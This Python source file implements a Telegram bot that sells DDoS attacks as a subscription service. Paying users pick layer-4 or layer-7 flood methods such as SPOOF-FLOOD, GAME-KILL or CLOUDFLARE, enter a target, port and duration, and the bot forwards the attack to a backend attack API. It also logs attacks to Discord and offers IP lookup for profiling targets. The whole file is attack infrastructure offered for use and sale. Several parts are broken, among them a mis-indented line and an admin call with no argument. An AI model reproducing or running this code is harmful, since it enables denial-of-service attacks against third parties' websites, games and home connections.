import telepot
import time
import datetime
import requests
import threading
import subprocess
import json
from telepot.loop import MessageLoop
import pytz
from urllib.parse import urlparse
import ipaddress
from telepot.namedtuple import ReplyKeyboardMarkup, KeyboardButton


webhook_url = ''  # discord webhook here
TOKEN = ''  # your bot token here

attack_slots = 2
attack_slots_lock = threading.Lock()
last_attack_time = None
successful_attacks = []

def read_authorized_users():
    try:
        with open('users.txt', 'r') as f:
            lines = f.readlines()
            authorized_users = {}
            for line in lines:
                if line.strip():
                    user_id, expiry_date_str, max_duration_str, concurrents_str = line.strip().split(':')
                    expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
                    max_duration = int(max_duration_str)
                    concurrents = int(concurrents_str)
                    authorized_users[int(user_id)] = {
                        'expiry_date': expiry_date,
                        'max_duration': max_duration,
                        'concurrents': concurrents
                    }
            return authorized_users
    except FileNotFoundError:
        return {}

def write_authorized_users(authorized_users):
    with open('users.txt', 'w') as f:
        for user_id, info in authorized_users.items():
            expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
            max_duration_str = str(info['max_duration'])
            concurrents_str = str(info['concurrents'])
            f.write(f"{user_id}:{expiry_date_str}:{max_duration_str}:{concurrents_str}\n")

def is_user_authorized(user_id):
    global authorized_users
    if user_id not in authorized_users:
        return False
    info = authorized_users[user_id]
    if info['expiry_date'] < datetime.datetime.now():
        del authorized_users[user_id]
        write_authorized_users(authorized_users)
        bot.sendMessage(user_id, 'Your plan has expired. Contact @atusssssssss to renew.')
        return False
    return True

def add_admin_user(user_id):
    global admin_users
    admin_users.add(user_id)

def remove_admin_user(user_id):
    global admin_users
    if user_id in admin_users:
        admin_users.remove(user_id)

def get_username(user_id):
    user = bot.getChat(user_id)
    if 'username' in user:
        return user['username']
    else:
        return None

def convert_to_vietnam_time(utc_time):
    utc = pytz.timezone('UTC')
    vietnam = pytz.timezone('Asia/Ho_Chi_Minh')

    utc_time = utc_time.replace(tzinfo=utc)
    vietnam_time = utc_time.astimezone(vietnam)

    return vietnam_time

blacklisted_targets = set()

def read_blacklisted_targets():
    try:
        with open('blacklist.txt', 'r') as f:
            lines = f.readlines()
            for line in lines:
                if line.strip():
                    blacklisted_targets.add(line.strip())
    except FileNotFoundError:
        pass

def write_blacklisted_targets():
    with open('blacklist.txt', 'w') as f:
        for target in blacklisted_targets:
            f.write(f"{target}\n")

def is_ip_blacklisted(ip_address):
    return ip_address in blacklisted_targets

def read_methods():
    try:
        with open('methods.txt', 'r') as f:
            methods = [method.strip().lower() for method in f.readlines()]
            return methods
    except FileNotFoundError:
        return []

def is_ip_in_blacklist(ip_address):
    for blacklisted_ip in blacklisted_targets:
        if ip_address == blacklisted_ip:
            return True
    return False

def is_domain_in_blacklist(domain):
    for blacklisted_domain in blacklisted_targets:
        if blacklisted_domain in domain:
            return True
    return False

def get_target_type(target):
    try:
        ipaddress.ip_address(target)
        return 'ip'
    except ValueError:
        return 'domain'

def is_target_blacklisted(target):
    target_type = get_target_type(target)
    if target_type == 'domain':
        domain = get_domain_from_target(target)
        return is_domain_in_blacklist(domain)
    elif target_type == 'ip':
        return is_ip_in_blacklist(target)
    return False

def get_domain_from_target(target):
    parsed_url = urlparse(target)
    return parsed_url.netloc

def decrease_attack_slots_for_user(user_id):
    global authorized_users
    if user_id in authorized_users:
        with attack_slots_lock:
            authorized_users[user_id]['attack_slots'] -= 1
            write_authorized_users(authorized_users)


def get_request_id2(target):
    url = f'https://check-host.net/check-http?host={target}&max_nodes=1'
    headers = {'Accept': 'application/json'}
    
    try:
        response = requests.get(url, headers=headers, timeout=10) 
        if response.status_code == 200:
            data = response.json()
            return data.get('request_id')
        else:
            return None
    except Exception as e:
        return None

def get_ipinfo_data(ip):
    api_url = f"https://ipinfo.io/{ip}?token=YOUR_API_TOKEN"
    response = requests.get(api_url)
    if response.status_code == 200:
        return response.json()
    else:
        return None


def get_request_id(target):
    url = f'https://check-host.net/check-http?host={target}&max_nodes=30'
    headers = {'Accept': 'application/json'}
    
    try:
        response = requests.get(url, headers=headers, timeout=10) 
        if response.status_code == 200:
            data = response.json()
            return data.get('request_id')
        else:
            return None
    except Exception as e:
        return None

def get_country_name(ip):
    response = requests.get(f"https://api.db-ip.com/v2/free/{ip}") 
    if response.status_code == 200:
        data = response.json()
        if 'countryName' in data:
            return data['countryName']
    return None

def get_check_result(request_id):
    url = f'https://check-host.net/check-result/{request_id}'
    command = [
        "curl",
        "-H", "Accept: application/json",
        url
    ]

    try:
       
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            
            time.sleep(5) 

           
            result = subprocess.run(command, capture_output=True, text=True)
            if result.returncode == 0:
                json_data = result.stdout
                data = json.loads(json_data)
                return data
            else:
                return None
        else:
            return None
    except Exception as e:
        return None


def get_check_result2(request_id):
    url = f'https://check-host.net/check-result/{request_id}'
    command = [
        "curl",
        "-H", "Accept: application/json",
        url
    ]

    try:
       
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            
            time.sleep(1) 

           
            result = subprocess.run(command, capture_output=True, text=True)
            if result.returncode == 0:
                json_data = result.stdout
                data = json.loads(json_data)
                return data
            else:
                return None
        else:
            return None
    except Exception as e:
        return None




def process_result(data):
    result = ""
    for node, info in data.items():
        if info is not None and len(info) > 0:
            time_connect = round(info[0][1], 2)
            status = info[0][2]
            code = info[0][3]
            ip = info[0][4]
            
            country_name = get_country_name(ip)
            if country_name:
                result += f"{code} ({status}) | {time_connect} s | Country: {country_name}\n"
            else:
                result += f"{code} ({status}) | Country: N/A\n"
    return result


def handle_response(data):
    result = ""
    for node, info in data.items():
        if info is not None and len(info) > 0:
            ip = info[0][4]
            result += f"{ip}"
    return result

def get_ipgeolocation_data(ip):
    api_key = "YOUR_API_KEY"
    fields = "country_name,country_capital,state_prov,city,isp,organization"
    url = f"https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip}&fields={fields}"
    response = requests.get(url)
    if response.status_code == 200:
        ip_data = response.json()
        formatted_data = (
            f"<b>IP:</b> {ip_data.get('ip')}\n"
            f"<b>ISP:</b> {ip_data.get('isp')}\n"
            f"<b>Organization:</b> {ip_data.get('organization')}\n"
            f"<b>Country Name:</b> {ip_data.get('country_name')}\n"
            f"<b>Country Capital:</b> {ip_data.get('country_capital')}\n"
            f"<b>City:</b> {ip_data.get('city')}\n"
        )
        return formatted_data
    else:
        return "No data found"



def perform_attack(target, port, duration, method, user_id):
    info = authorized_users[user_id]
    max_duration = info['max_duration']
    concurrents = info['concurrents']
    user_attack_slots = info.get('attack_slots', 0)
    url = f'http://api.example.com/api/attack?user=abcdxyz&secret=123123&host={target}&port={port}&time={duration}&method={method}'
    response = requests.get(url)
    response_json = response.json()
    check_link = f'https://check-host.net/check-http?host={target}&csrf_token=5b0f02bb3740ee3e4d5da86a86022cf524706bd3'
    link_text = f'<a href="{check_link}">Check Result</a>'
   
    bot.sendMessage(user_id, f'<strong>Attack Sent!!</strong>\n\n<strong>Target:</strong> {target}\n<strong>Port:</strong> {port}\n<strong>Duration:</strong> {duration}\n<strong>Method:</strong> {method}\n{link_text}', parse_mode='HTML')
        threading.Timer(float(duration), decrease_attack_slots_for_user, args=[user_id]).start()

       
    vietnam_time = convert_to_vietnam_time(datetime.datetime.now())
    username = get_username(user_id) or f'Unknown user {user_id}'
    attack_info = {
        'target': target,
        'port': port,
        'duration': duration,
        'method': method,
        'user_id': user_id,
        'time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    successful_attacks.append(attack_info)
        
       
    message = f"**Buffalo Attack Logs:**\n\n**Username:** {username}\n**Target:** {target}\n**Port:** {port}\n**Duration:** {duration}\n**Method:** {method}\n**Date:** {vietnam_time.strftime('%Y-%m-%d %H:%M:%S')}"
    embeds = [
      {
        'title': message,
        'color': 16711680 
      }
    ]
        
    payload = {
      'username': 'Buffalo Webhook',
      'embeds': embeds
    }

    headers = {
        'Content-Type': 'application/json'
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

    if response.status_code != 204:
        print('Failed to send message to Discord webhook')

class UserState:
    def __init__(self, method=None, target=None, port=None, time=None):
        self.method = method
        self.target = target
        self.port = port
        self.time = time

states = {}
def handle_message(msg):
    global authorized_users
    global admin_users
    global attack_slots
    global last_attack_time
    global successful_attacks

    
  
    content_type, chat_type, chat_id = telepot.glance(msg)
    user_id = msg['from']['id']
    if not last_attack_time:
        last_attack_time = None

    if not is_user_authorized(user_id):
        bot.sendMessage(chat_id, f'You dont have plan. Contact @atusssssssss for buying plan.\n\nYour ID: <code>{user_id}</code>', parse_mode='HTML')
        return

    if user_id not in admin_users:
        if content_type == 'text' and (msg['text'].startswith('/adduser') or msg['text'].startswith('/removeuser') or msg['text'].startswith('/updateuser') or msg['text'].startswith('/userlist')):
            bot.sendMessage(chat_id, 'Only admin can using commands.')
            return
          
    if 'states' not in globals():
        global states
        states = {}
      
    if content_type == 'text':
        text = msg['text']
        if text == '/help':
            message = '''<strong>User Commands:</strong>
            
- /methods - <strong>Show attack methods.</strong>
- /attack - <strong>Sent attack.</strong>
- /running - <strong>Show running attacks.</strong>
- /info - <strong>Show bot information.</strong>
- /check - <strong>Check HTTP Status of a website.</strong>
- /find - <strong>Find information of a website.</strong>
- /search - <strong>Look Up data of a IP Address.</strong>
- /getid - <strong>Get your ID.</strong>
- /plan - <strong>See your plan.</strong>

<strong>Admin Commands:</strong>

- /adduser - <strong>Add new user.</strong>
- /removeuser - <strong>Remove user.</strong>
- /updateuser - <strong>Update user information.</strong>
- /userlist - <strong>Show all users information.</strong>
- /blacklist - <strong>Add target to BlackList.</strong>
- /unblacklist - <strong>Remove target from BlackList.</strong>
- /listblacklist - <strong>See all BlackList.</strong>'''
            bot.sendMessage(chat_id, message, parse_mode='HTML')




        elif text.startswith('/search'):
            args = text.split()[1:]
            if len(args) != 1:
                bot.sendMessage(chat_id, 'Using: /search [ip]')
                return

            ip_to_search = args[0]
            ipinfo_data = get_ipinfo_data(ip_to_search)
            if ipinfo_data:
                result_text = ""
                for key, value in ipinfo_data.items():
                    if key == 'domains':
                        continue
                    elif isinstance(value, dict):
                        result_text += f"<b>{key.capitalize()}:</b>\n"
                        for sub_key, sub_value in value.items():
                            result_text += f"  <i>{sub_key.capitalize()}:</i> {sub_value}\n"
                    else:
                        result_text += f"<b>{key.capitalize()}:</b> {value}\n"
        
                bot.sendMessage(chat_id, result_text, parse_mode="HTML")
            else:
                bot.sendMessage(chat_id, 'Error: IP not found')




          
        elif text.startswith('/find'):
            args = text.split()[1:]
            if len(args) != 1:
                bot.sendMessage(chat_id, 'Using: /find [url]')
                return

            target = args[0]
            request_id = get_request_id2(target)
            if request_id:
                find_ip = get_check_result2(request_id)
                if find_ip:
                    real_ip = handle_response(find_ip)
                    if real_ip:
                        ipgeolocation_data = get_ipgeolocation_data(real_ip)
                        if ipgeolocation_data:
                            bot.sendMessage(chat_id, ipgeolocation_data, parse_mode="HTML")
                        else:
                           bot.sendMessage(chat_id, 'Error: Unable to retrieve IP geolocation data')
                    else:
                        bot.sendMessage(chat_id, 'Error: Unable to extract real IP')
                else:
                    bot.sendMessage(chat_id, 'Error: Unable to get IP check result')
            else:
                bot.sendMessage(chat_id, 'Error: Unable to get response from API')






      

        

      

        elif text.startswith('/check'):
            args = text.split()[1:]
            if len(args) != 1:
                bot.sendMessage(chat_id, 'Using: /check [url]')
                return

            target = args[0]
            bot.sendMessage(chat_id, 'Wait 5s for checking')
            request_id = get_request_id(target)
            if request_id:
                response_data = get_check_result(request_id)
                if response_data:
                    result_text = process_result(response_data)
                    if result_text:
                        bot.sendMessage(chat_id, f"{target} check result") 
                        bot.sendMessage(chat_id, result_text)
                    else:
                        
                        bot.sendMessage(chat_id, f"Cannot connect to {target} server") 
                else:
                    bot.sendMessage(chat_id, 'Error: Can not get response from API')
            else:
                bot.sendMessage(chat_id, 'Error: Can not get response from API')









      
  
        elif text == '/plan':
            info = authorized_users.get(user_id)
            if info:
                username = get_username(user_id) or f'Unknown user {user_id}'
                expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
                max_duration_str = str(info['max_duration'])
                concurrents = info.get('concurrents', 0)
                message = f'<strong>Plan details for</strong> @{username}\n<strong>User ID:</strong> <code>{user_id}</code>\n<strong>Expire Time:</strong> {expiry_date_str}\n<strong>Max Time:</strong> {max_duration_str} seconds\n<strong>Concurrents:</strong> {concurrents}'
                bot.sendMessage(chat_id, message, parse_mode='HTML')

        
        elif text.startswith('/getid'):
            user_id = msg['from']['id']
            username = get_username(user_id)
            message = f'<b>Username:</b> @{username}\n<b>User ID:</b> <code>{user_id}</code>'
            bot.sendMessage(chat_id, message, parse_mode='HTML')
        elif text.startswith('/blacklist'):
            if user_id not in admin_users:
                bot.sendMessage(chat_id, 'Only admin can use this command.')
                return

            args = text.split()[1:]
            if len(args) != 1:
                bot.sendMessage(chat_id, 'Using: /blacklist [target]')
                return

            target = args[0]
            if target in blacklisted_targets:
                bot.sendMessage(chat_id, f'Target "{target}" is already exist.')
                return
            else:
                blacklisted_targets.add(target)
                write_blacklisted_targets()
                bot.sendMessage(chat_id, f'Target "{target}" has been added to the blacklist.')
        elif text.startswith('/unblacklist'):
            if user_id not in admin_users:
                bot.sendMessage(chat_id, 'Only admin can use this command.')
                return

            args = text.split()[1:]
            if len(args) != 1:
                bot.sendMessage(chat_id, 'Using: /unblacklist [target]')
                return

            target = args[0]
            if target in blacklisted_targets:
                blacklisted_targets.remove(target)
                write_blacklisted_targets()
                bot.sendMessage(chat_id, f'Target "{target}" has been removed from the blacklist.')
            else:
                bot.sendMessage(chat_id, f'Target "{target}" is not in the blacklist.')
        elif text == '/listblacklist':
            if user_id not in admin_users:
                bot.sendMessage(chat_id, 'Only admin can use this command.')
                return

            if not blacklisted_targets:
                bot.sendMessage(chat_id, 'The blacklist is empty.')
                return

            message = '<strong>Blacklisted Targets</strong>\n'

            for target in blacklisted_targets:
                message += f'- {target}\n'

            bot.sendMessage(chat_id, message, parse_mode='HTML')

        elif text == '/methods':
            methods = read_methods()
            if not methods:
                bot.sendMessage(chat_id, 'No methods found.')
            else:
                method_list = '\n- '.join(methods)
                message = f'<strong>List Methods</strong>\n- {method_list}'
                bot.sendMessage(chat_id, message, parse_mode='HTML')
        elif text == '/info':
            message = '<strong>Owner</strong>: @atusssssssss\n<strong>Version</strong>: 2.0\nIf you want to buy source. Contact @atusssssssss.'
            bot.sendMessage(chat_id, message, parse_mode='HTML')

        elif text == '/running':
            handle_running_command(chat_id)
        elif text.startswith('/attack'):
            if not is_user_authorized(user_id):
                bot.sendMessage(chat_id, 'You dont have plan. Contact @atusssssssss for buying plan.')
                return

            
                return
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                                      [KeyboardButton(text='LAYER4'), KeyboardButton(text='LAYER7')],
                    [KeyboardButton(text='❌ Cancel')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            bot.sendMessage(chat_id, 'Choose an attack method:', reply_markup=keyboard)
            last_attack_time = datetime.datetime.now()
            
        elif text == 'LAYER7':
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text='DESTROY'), KeyboardButton(text='HTTPS'), KeyboardButton(text='CLOUDFLARE')],
                    [KeyboardButton(text='❌ Cancel')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            bot.sendMessage(chat_id, 'Select method:', reply_markup=keyboard)
        
        
        elif text == 'LAYER4':
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text='TCPLEGIT'), KeyboardButton(text='HOME-KILL'), KeyboardButton(text='SSH')],
                    [KeyboardButton(text='GAME-KILL'), KeyboardButton(text='EQUINOXV2'), KeyboardButton(text='HANDSHAKE')],
                    [KeyboardButton(text='SOCKET'), KeyboardButton(text='SPOOF-FLOOD')],
                    [KeyboardButton(text='❌ Cancel')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            bot.sendMessage(chat_id, 'Select method', reply_markup=keyboard)
        elif text.lower() == 'cancel':
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text='/methods'), KeyboardButton(text='/attack')],
                    [KeyboardButton(text='/info'), KeyboardButton(text='/getid'), KeyboardButton(text='/running')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            bot.sendMessage(chat_id, 'Back to command list:', reply_markup=keyboard)




        elif text in ['TCPLEGIT', 'HOME-KILL', 'SSH', 'GAME-KILL', 'EQUINOXV2', 'HANDSHAKE', 'SOCKET', 'SPOOF-FLOOD']:
          method = text
           
          bot.sendMessage(chat_id, 'Enter target:')
            
            
          user_state = UserState(method=method)
          states[chat_id] = user_state
        elif chat_id in states and states[chat_id].method in ['TCPLEGIT', 'HOME-KILL', 'SSH', 'GAME-KILL', 'EQUINOXV2', 'HANDSHAKE', 'SOCKET', 'SPOOF-FLOOD']:
            
            
            user_state = states[chat_id]
            method = user_state.method
            if not user_state.target:
                
                user_state.target = text
                if is_target_blacklisted(user_state.target):
                  bot.sendMessage(chat_id, 'Target Blacklisted.')
                  del states[chat_id]  
                  return
                bot.sendMessage(chat_id, f'🌐 {user_state.target}\n<strong>🖥️ Layer:</strong> 4\n<strong>Method:</strong> {method}\n└ <strong>Enter Port:</strong>', parse_mode='HTML')

            elif not user_state.port:
              
                
              user_state.port = text
              
              bot.sendMessage(chat_id, f'🌐 {user_state.target}\n<strong>🖥️ Layer:</strong> 4\n<strong>Method:</strong> {method}\n<strong>Port:</strong> {user_state.port}\n└ <strong>Enter Time:</strong>', parse_mode='HTML')

            elif not user_state.time:
              
              user_state.time = text

              
              info = authorized_users[user_id]
              max_duration = info['max_duration']
              concurrents = info.get('concurrents', 0)
              user_attack_slots = info.get('attack_slots', 0)
              if concurrents <= 0:
                bot.sendMessage(chat_id, 'Your concurrents count is zero. Contact @atusssssssss to update your plan.')
                del states[chat_id]  
                return
              if user_attack_slots >= concurrents:
                bot.sendMessage(chat_id, 'MAX CONCURRENTS. Your concurrents limit has been reached. Please wait for an available slot.')
                del states[chat_id]  
                return
              if int(user_state.time) > max_duration:
                bot.sendMessage(chat_id, 'Your maximum attack duration is {} seconds. Please buy more or using less attack time.'.format(max_duration))
                del states[chat_id]  
                return

            
            
              perform_attack(user_state.target, user_state.port, user_state.time, method, chat_id)
              threading.Timer(float(user_state.time), decrease_attack_slots_for_user, args=[user_id]).start()
              info['attack_slots'] = user_attack_slots + 1
              write_authorized_users(authorized_users)
              del states[chat_id]





      
        elif text == 'DESTROY' or text == 'HTTPS' or text == 'CLOUDFLARE':
            
            method = text
            
            bot.sendMessage(chat_id, 'Enter target:')
            
            
            user_state = UserState(method=method)
            states[chat_id] = user_state
        elif chat_id in states and states[chat_id].method in ['DESTROY', 'HTTPS', 'CLOUDFLARE']:
            
            
            
            user_state = states[chat_id]
            method = user_state.method
            if not user_state.target:
                
                user_state.target = text
                if is_target_blacklisted(user_state.target):
                  bot.sendMessage(chat_id, 'Target Blacklisted.')
                  del states[chat_id]  
                  return
                
                if 'http://' in user_state.target:
                    user_state.port = '80'
                elif 'https://' in user_state.target:
                    user_state.port = '443'
                else:
                    
                    bot.sendMessage(chat_id, 'Invalid URL')
                    return
                
                bot.sendMessage(chat_id, f'🌐 {user_state.target}\n<strong>🖥️ Layer:</strong> 7\n<strong>Method:</strong> {method}\n<strong>Port:</strong> {user_state.port}\n└ <strong>Enter Time:</strong>', parse_mode='HTML')
            elif not user_state.time:
              
              user_state.time = text

              
              info = authorized_users[user_id]
              max_duration = info['max_duration']
              concurrents = info.get('concurrents', 0)
              user_attack_slots = info.get('attack_slots', 0)
              if concurrents <= 0:
                bot.sendMessage(chat_id, 'Your concurrents count is zero. Contact @atusssssssss to update your plan.')
                del states[chat_id]  
                return
              if user_attack_slots >= concurrents:
                bot.sendMessage(chat_id, 'MAX CONCURRENTS. Your concurrents limit has been reached. Please wait for an available slot.')
                del states[chat_id]  
                return
              if int(user_state.time) > max_duration:
                bot.sendMessage(chat_id, 'Your maximum attack duration is {} seconds. Please buy more or using less attack time.'.format(max_duration))
                del states[chat_id]  
                return

            
             
              perform_attack(user_state.target, user_state.port, user_state.time, method, chat_id)
              threading.Timer(float(user_state.time), decrease_attack_slots_for_user, args=[user_id]).start()
              info['attack_slots'] = user_attack_slots + 1
              write_authorized_users(authorized_users)
              del states[chat_id]
        
        
        
        
        elif text.startswith('/adduser'):
            args = text.split()[1:]
            if len(args) != 4:
                bot.sendMessage(chat_id, 'Using: /adduser [id] [expiry date] [max attack times] [concurrents]')
                return

            target_user_id = int(args[0])
            expiry_date_str = args[1]
            max_duration = int(args[2])
            concurrents = int(args[3])
            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
            authorized_users[target_user_id] = {
                'expiry_date': expiry_date,
                'max_duration': max_duration,
                'concurrents': concurrents
            }
            write_authorized_users(authorized_users)
            bot.sendMessage(chat_id, 'Added "{}" to access list with expiry date {} and maximum duration {} seconds and maximum concurrents is {}.'.format(target_user_id, expiry_date_str, max_duration, concurrents))
        elif text.startswith('/removeuser'):
            bot.sendMessage(chat_id, 'Using: /removeuser [id]')
            user_id = int(text.split()[1])
            if user_id in authorized_users:
                del authorized_users[user_id]
                write_authorized_users(authorized_users)
                bot.sendMessage(chat_id, 'Removed {} from the access list.'.format(user_id))
            else:
                bot.sendMessage(chat_id, 'User {} not in the access list.'.format(user_id))
        elif text.startswith('/updateuser'):
            args = text.split()[1:]
            if len(args) != 4:
                bot.sendMessage(chat_id, 'Using: /updateuser [id] [expiry date] [max attack times] [concurrents]')
                return

            target_user_id = int(args[0])
            expiry_date_str = args[1]
            max_duration = int(args[2])
            concurrents = int(args[3])
            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
            if target_user_id in authorized_users:
                authorized_users[target_user_id]['expiry_date'] = expiry_date
                authorized_users[target_user_id]['max_duration'] = max_duration
                authorized_users[target_user_id]['concurrents'] = concurrents
                write_authorized_users(authorized_users)
                bot.sendMessage(chat_id, 'Updated user {} with expiry date {}, maximum duration {} seconds, and {} concurrents.'.format(target_user_id, expiry_date_str, max_duration, concurrents))
            else:
                bot.sendMessage(chat_id, 'User {} is not in the access list.'.format(target_user_id))
        elif text == '/userlist':
            handle_userlist_command(chat_id)
        


def handle_userlist_command(chat_id):
    global authorized_users
    userlist = ''
    for user_id, info in authorized_users.items():
        username = get_username(user_id)
        expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
        max_duration_str = str(info['max_duration'])
        concurrents_str = str(info['concurrents'])
        userlist += f'<strong>Username:</strong> @{username}\n<strong>User ID: </strong><code>{user_id}</code>\n<strong>Expiry Date:</strong> {expiry_date_str}\n<strong>Max Duration:</strong> {max_duration_str}\n<strong>Concurrents:</strong> {concurrents_str}\n\n'
    bot.sendMessage(chat_id, userlist, parse_mode='HTML')



def handle_running_command(chat_id):
    global successful_attacks

    if len(successful_attacks) == 0:
        message = '<strong>NO ONGOING ATTACKS.</strong>'
    else:
        message = '<strong>ONGOING ATTACKS:</strong>\n\n'
        for attack in successful_attacks:
            user_id = attack["user_id"]
            username = get_username(user_id)
            target = attack["target"]
            port = attack["port"]
            duration = int(attack["duration"])
            method = attack["method"]
            start_time = datetime.datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')

            info = authorized_users.get(user_id)
            if info and info.get('attack_slots', 0) > 0:
                user_attack_slots = info.get('attack_slots', 0)
                remaining_time = duration - (datetime.datetime.now() - start_time).total_seconds()
                remaining_time_str = f'{int(remaining_time)} seconds' if remaining_time > 0 else 'Finished'
                concurrents = info.get('concurrents', 0)
                remaining_concurrents = concurrents - user_attack_slots
                message += f'<strong>Username:</strong> @{username}\n<strong>User ID:</strong> {user_id}\n<strong>Remaining Concurrents:</strong> {remaining_concurrents}/{concurrents}\n<strong>Target:</strong> {target}\n<strong>Port:</strong> {port}\n<strong>Time Remaining:</strong> {remaining_time_str}\n<strong>Method:</strong> {method}\n\n'
            else:
                successful_attacks.remove(attack)

    bot.sendMessage(chat_id, message, parse_mode='HTML')








def check_expired_users():
    global authorized_users
    now = datetime.datetime.now()
    for user_id, user_info in list(authorized_users.items()):
        expiry_date = user_info['expiry_date']
        if expiry_date < now:
            del authorized_users[user_id]
            write_authorized_users(authorized_users)
            bot.sendMessage(user_id, 'Your plan has expired. Contact @atusssssssss to renew.')
    threading.Timer(86400, check_expired_users).start()

def increase_attack_slots():
    global attack_slots
    with attack_slots_lock:
        attack_slots += 1

def decrease_attack_slots():
    global attack_slots
    with attack_slots_lock:
        attack_slots -= 1

if __name__ == '__main__':
    read_blacklisted_targets()
    bot = telepot.Bot(TOKEN)
    authorized_users = read_authorized_users()
    admin_users = set()
    add_admin_user()  # admin user id here

    MessageLoop(bot, handle_message).run_as_thread()
    print('Bot running...')
    check_expired_users()
    while True:
        try:
            time.sleep(10)
        except KeyboardInterrupt:
            print('\nBot stopped.')
            break
